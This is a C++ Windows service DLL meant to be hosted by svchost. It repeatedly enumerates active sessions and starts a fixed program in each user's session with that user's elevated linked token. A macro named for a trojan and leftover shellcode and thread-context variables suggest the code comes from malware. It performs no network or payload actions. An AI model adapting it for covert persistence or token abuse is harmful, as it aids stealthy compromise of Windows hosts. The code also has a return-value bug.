#include <Windows.h>
#include <WtsApi32.h>
#include <UserEnv.h>

#include <map>

#include <string>
//---------------------------------------------------------------------------
using namespace std;
//---------------------------------------------------------------------------
// W
typedef BOOL(WINAPI *t_WTSEnumerateProcesses)(HANDLE, DWORD, DWORD, PWTS_PROCESS_INFO *, DWORD *);
// W
typedef BOOL(WINAPI *t_WTSEnumerateSessions)(HANDLE, DWORD, DWORD, PWTS_SESSION_INFO *, DWORD *);
// W
typedef BOOL(WINAPI *t_WTSQuerySessionInformation)(HANDLE, DWORD, WTS_INFO_CLASS, LPTSTR *, DWORD *);
typedef BOOL(WINAPI *t_WTSQueryUserToken)(ULONG, PHANDLE);
typedef VOID(WINAPI *t_WTSFreeMemory)(PVOID);

typedef DWORD(WINAPI *t_WTSGetActiveConsoleSessionId)(VOID);

typedef BOOL(WINAPI *t_CreateEnvironmentBlock)(LPVOID *, HANDLE, BOOL);
typedef BOOL(WINAPI *t_DestroyEnvironmentBlock)(LPVOID);
//---------------------------------------------------------------------------
typedef struct tagWTS_IMPORTS
{
	HMODULE hwtsapi;
	HMODULE huserenv;

	UINT usercount;

	// W
	t_WTSEnumerateProcesses p_WTSEnumerateProcesses;
	// W
	t_WTSEnumerateSessions p_WTSEnumerateSessions;
	// W
	t_WTSQuerySessionInformation p_WTSQuerySessionInformation;
	t_WTSQueryUserToken p_WTSQueryUserToken;
	t_WTSFreeMemory p_WTSFreeMemory;

	t_WTSGetActiveConsoleSessionId p_WTSGetActiveConsoleSessionId;

	t_CreateEnvironmentBlock p_CreateEnvironmentBlock;
	t_DestroyEnvironmentBlock p_DestroyEnvironmentBlock;
}WTS_IMPORTS, *PWTS_IMPORTS;

VOID ImportsLoad(PWTS_IMPORTS pis)
{
	HMODULE hmodule;

	ZeroMemory(pis, sizeof(WTS_IMPORTS));

	hmodule = LoadLibrary(L"Wtsapi32.dll");
	if (hmodule != NULL)
	{
		pis->hwtsapi = hmodule;

		pis->p_WTSEnumerateProcesses = (t_WTSEnumerateProcesses)GetProcAddress(hmodule, "WTSEnumerateProcessesW");
		pis->p_WTSEnumerateSessions = (t_WTSEnumerateSessions)GetProcAddress(hmodule, "WTSEnumerateSessionsW");
		pis->p_WTSQuerySessionInformation = (t_WTSQuerySessionInformation)GetProcAddress(hmodule, "WTSQuerySessionInformationW");
		pis->p_WTSQueryUserToken = (t_WTSQueryUserToken)GetProcAddress(hmodule, "WTSQueryUserToken");
		pis->p_WTSFreeMemory = (t_WTSFreeMemory)GetProcAddress(hmodule, "WTSFreeMemory");
	}

	hmodule = GetModuleHandle(L"Kernel32.dll");
	if (hmodule != NULL)
	{
		pis->p_WTSGetActiveConsoleSessionId = (t_WTSGetActiveConsoleSessionId)GetProcAddress(hmodule, "WTSGetActiveConsoleSessionId");
	}

	hmodule = LoadLibrary(L"Userenv.dll");
	if (hmodule != NULL)
	{
		pis->huserenv = hmodule;

		pis->p_CreateEnvironmentBlock = (t_CreateEnvironmentBlock)GetProcAddress(hmodule, "CreateEnvironmentBlock");
		pis->p_DestroyEnvironmentBlock = (t_DestroyEnvironmentBlock)GetProcAddress(hmodule, "DestroyEnvironmentBlock");
	}
}

BOOL RunAsUser(PWTS_IMPORTS pis, DWORD sessionid, const TCHAR *username, TCHAR *commandline)
{
	PROCESS_INFORMATION pi;
	DWORD exitcode;
	UINT i, count;
	HANDLE htoken;
	HANDLE hduptoken = NULL;
	LUID luid;
	LPVOID lpti;
	DWORD returnlength = 0;
	LPVOID lpenvironment = NULL;
	DWORD creationflags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;
	STARTUPINFO si;
	SECURITY_DESCRIPTOR sd;
	SECURITY_ATTRIBUTES sa0;
	SECURITY_ATTRIBUTES sa1;
	CONTEXT ctx;
	HANDLE h0 = NULL;
	HANDLE h1 = NULL;
	LPVOID remoteshellcode;
	DWORD_PTR *p;
	BOOL flag0 = FALSE;
	BOOL flag1;
	BOOL result = FALSE;

	{
		flag1 = FALSE;

		if (pis->p_WTSQueryUserToken(sessionid, &htoken))
		{
			if (GetTokenInformation(htoken, TokenLinkedToken, &lpti, sizeof(lpti), &returnlength))
			{
				hduptoken = lpti;
			}
			else
			{
				if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
				{
					DuplicateTokenEx(htoken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hduptoken);
				}
			}

			if (hduptoken != NULL)
			{
				if (!SetTokenInformation(hduptoken, TokenSessionId, &sessionid, sizeof(sessionid)))
				{
				}

				if (ImpersonateLoggedOnUser(hduptoken))
				{
					if (pis->p_CreateEnvironmentBlock(&lpenvironment, hduptoken, TRUE))
					{
						creationflags |= CREATE_UNICODE_ENVIRONMENT;
					}
					else
					{
						//WriteLog("CreateEnvironmentBlock Failed\n");
						lpenvironment = NULL;
					}

					ZeroMemory(&si, sizeof(si));
					si.cb = sizeof(STARTUPINFO);
					si.dwFlags = STARTF_USESHOWWINDOW;
					si.wShowWindow = SW_SHOW;

					flag1 = CreateProcessAsUser(
						hduptoken,				// client's access token
						NULL,					// file to execute
						commandline,			// command line     
						NULL,					// pointer to process SECURITY_ATTRIBUTES
						NULL,					// pointer to thread SECURITY_ATTRIBUTES
						FALSE,					// handles are inheritable
						creationflags,			// creation flags
						lpenvironment,			// pointer to new environment block
						NULL,					// name of current directory
						&si,					// pointer to STARTUPINFO structure
						&pi						// receives information about new process
					);
					if (flag1)
					{
						CloseHandle(pi.hThread);
						CloseHandle(pi.hProcess);
					}

					if (lpenvironment != NULL)
					{
						pis->p_DestroyEnvironmentBlock(lpenvironment);
					}

					RevertToSelf();
				}

				CloseHandle(hduptoken);
			}

			CloseHandle(htoken);
		}
	}
	return(result);
}

UINT UpdateSessions(PWTS_IMPORTS pis, map<wstring, unsigned int> *users, WCHAR *commandline)
{
	map<wstring, unsigned int>::iterator it;
	WTS_SESSION_INFO *wsis;
	DWORD count;
	DWORD i;
	DWORD j = 0;
	WCHAR username[256];
	LPTSTR lpbuffer;
	DWORD bufferlength;
	int flag;

	for (it = users->begin(); it != users->end(); ++it)
	{
		it->second = 0;
	}

	if (pis->p_WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &wsis, &count))
	{
		for (i = 0; i < count; i++)
		{
			if (wsis[i].State == WTSActive)
			{
				flag = 0;

				username[0] = '\0';
				if (pis->p_WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, wsis[i].SessionId, WTSUserName, &lpbuffer, &bufferlength))
				{
					if (bufferlength + sizeof(WCHAR) + 20 < sizeof(username))
					{
						CopyMemory(username, lpbuffer, bufferlength);
						username[bufferlength / sizeof(WCHAR)] = '\0';

						wsprintf(username + bufferlength / sizeof(WCHAR), L"%d", wsis[i].SessionId);

						it = users->find(username);
						if (it == users->end())
						{
							users->insert(pair<wstring, unsigned int>(username, 1));

							flag = 1;
						}
						else
						{
							it->second = 1;
						}
					}

					pis->p_WTSFreeMemory(lpbuffer);
				}

				if (flag && username[0])
				{
					if (RunAsUser(pis, wsis[i].SessionId, username, commandline))
					{
					}
				}

				j++;
			}
		}

		pis->p_WTSFreeMemory(wsis); //ÊÍ·Å
	}

	i = 0;
	it = users->begin();
	while (it != users->end())
	{
		if (it->second == 0)
		{
			it = users->erase(it);
		}
		else
		{
			++it;

			i++;
		}
	}
	return(i);
}
//---------------------------------------------------------------------------
#define TROJAN_SERVICE_TYPE							SERVICE_WIN32_OWN_PROCESS
//---------------------------------------------------------------------------
SERVICE_STATUS_HANDLE servicestatushandle;
DWORD currentstate;
//---------------------------------------------------------------------------
BOOL APIENTRY DllMain(HMODULE hmodule, DWORD reason, LPVOID lpreserved)
//BOOL APIENTRY NewDllMain(HMODULE hmodule, DWORD reason, LPVOID lpreserved)
{
	BOOL result = TRUE;

	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	default:
		break;
	}

	return(result);
}
//---------------------------------------------------------------------------
int TellSCM(DWORD state, DWORD exitcode, DWORD progress)
{
	SERVICE_STATUS ss;

	// SERVICE_INTERACTIVE_PROCESS
	ss.dwServiceType = TROJAN_SERVICE_TYPE;
	ss.dwCurrentState = currentstate = state;
	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	ss.dwWin32ExitCode = exitcode;
	ss.dwServiceSpecificExitCode = 0;
	ss.dwCheckPoint = progress;
	ss.dwWaitHint = 1000;

	return(SetServiceStatus(servicestatushandle, &ss));
}
VOID WINAPI ServiceHandler(DWORD control)
{
	// not really necessary because the service stops quickly
	switch (control)
	{
	case SERVICE_CONTROL_STOP:
		//TellSCM(SERVICE_STOP_PENDING, 0, 1);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;
	case SERVICE_CONTROL_PAUSE:
		//TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;
	case SERVICE_CONTROL_CONTINUE:
		//TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;
	case SERVICE_CONTROL_INTERROGATE:
		TellSCM(currentstate, 0, 0);
		break;
	default:
		break;
	}
}

VOID WINAPI ServiceMain(int argc, wchar_t *argv[])
{
	WTS_IMPORTS pis[1];
	map<wstring, unsigned int> users;
	WCHAR commandline[1024];
	UINT i;

	servicestatushandle = RegisterServiceCtrlHandler(argv[0], (LPHANDLER_FUNCTION)ServiceHandler);
	if (servicestatushandle != NULL)
	{
		//TellSCM(SERVICE_START_PENDING,0,1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		// call Real Service function noew

		ImportsLoad(pis);

		wcscpy(commandline, L"C:\\Tools\\MyUI3a.exe");

		i = 0;
		do
		{
			UpdateSessions(pis, &users, commandline);

			Sleep(2000);
		} while (currentstate != SERVICE_STOPPED);

		if (currentstate != SERVICE_STOPPED)
		{
			TellSCM(SERVICE_STOPPED, 0, 0);
		}
	}
}

VOID WINAPI SvchostPushServiceGlobals(LPVOID lpGlobalData)
{
	//
}
//---------------------------------------------------------------------------